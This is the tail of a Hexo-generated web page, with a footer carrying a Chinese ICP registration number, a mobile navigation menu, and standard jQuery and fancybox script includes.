      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/members" class="mobile-nav-link">Members</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


    
  </div>

</body>

</html>